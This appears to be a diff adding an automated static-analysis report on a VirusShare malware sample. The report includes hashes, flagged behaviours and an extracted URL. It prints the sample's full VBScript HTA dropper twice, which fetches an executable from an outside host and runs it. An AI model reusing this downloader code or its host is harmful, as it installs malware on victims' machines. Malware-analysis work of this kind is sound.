@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Microsoft.XMLHTTP": "May download files from the Internet",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "open": "May open a file",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<HTA:APPLICATION ID=\"oHTA\"\nAPPLICATIONNAME=\"myApp\"\nBORDER=\"none\"\nBORDERSTYLE=\"normal\"\nCAPTION=\"no\"\nICON=\"\"\nMAXIMIZEBUTTON=\"no\"\nMINIMIZEBUTTON=\"no\"\nSHOWINTASKBAR=\"no\"\nSINGLEINSTANCE=\"no\"\nSYSMENU=\"yes\"\nVERSION=\"1.0\"\nWINDOWSTATE=\"minimize\"/>\n\n\n<script language=\"vbscript\">\n\n    self.MoveTo 5000,5000\n\n    payload = \"http://internetsolution.ru/hmd/hmd.exe\"\n    target = \"winrpx.exe\"\n\n    const ForWriting = 2\n\n    set xmlHTTP = CreateObject(\"Microsoft.XMLHTTP\")\n    xmlHTTP.open \"GET\", payload, false\n    xmlHTTP.send\n    contents = xmlHTTP.responseBody\n\n    Set fso = CreateObject(\"Scripting.FileSystemObject\")\n    Set f = fso.CreateTextFile(target, ForWriting)\n\n    for i = 0 to UBound(contents)\n        thischarcode = ascb(midb(contents, i+1, 1))\n        f.Write chr(thischarcode)\n    next\n\n    f.close\n\n    Set shell=CreateObject(\"WScript.Shell\")\n    shell.run(target)\n\n</script>"
+    },
+    "filename": "VirusShare_d292925bb9f1d9d94f2db147fdbce301",
+    "filesize": 880,
+    "filetype": "HTML document, ASCII text",
+    "hashes": {
+        "md5": "d292925bb9f1d9d94f2db147fdbce301",
+        "sha1": "41f6d9c714dffb76aa37197b17d56c91b56e9974",
+        "sha256": "3145d34a016570cc75bb5ab7fc7af86f3119c6ae3648fa06893c3fa451fc08bd"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<HTA:APPLICATION ID=\"oHTA\"",
+            "APPLICATIONNAME=\"myApp\"",
+            "BORDER=\"none\"",
+            "BORDERSTYLE=\"normal\"",
+            "CAPTION=\"no\"",
+            "ICON=\"\"",
+            "MAXIMIZEBUTTON=\"no\"",
+            "MINIMIZEBUTTON=\"no\"",
+            "SHOWINTASKBAR=\"no\"",
+            "SINGLEINSTANCE=\"no\"",
+            "SYSMENU=\"yes\"",
+            "VERSION=\"1.0\"",
+            "WINDOWSTATE=\"minimize\"/>",
+            "<script language=\"vbscript\">",
+            "    self.MoveTo 5000,5000",
+            "    payload = \"http://internetsolution.ru/hmd/hmd.exe\"",
+            "    target = \"winrpx.exe\"",
+            "    const ForWriting = 2",
+            "    set xmlHTTP = CreateObject(\"Microsoft.XMLHTTP\")",
+            "    xmlHTTP.open \"GET\", payload, false",
+            "    xmlHTTP.send",
+            "    contents = xmlHTTP.responseBody",
+            "    Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "    Set f = fso.CreateTextFile(target, ForWriting)",
+            "    for i = 0 to UBound(contents)",
+            "        thischarcode = ascb(midb(contents, i+1, 1))",
+            "        f.Write chr(thischarcode)",
+            "    next",
+            "    f.close",
+            "    Set shell=CreateObject(\"WScript.Shell\")",
+            "    shell.run(target)",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://internetsolution.ru/hmd/hmd.exe"
+        ]
+    },
+    "time": "0:00:00.293395",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
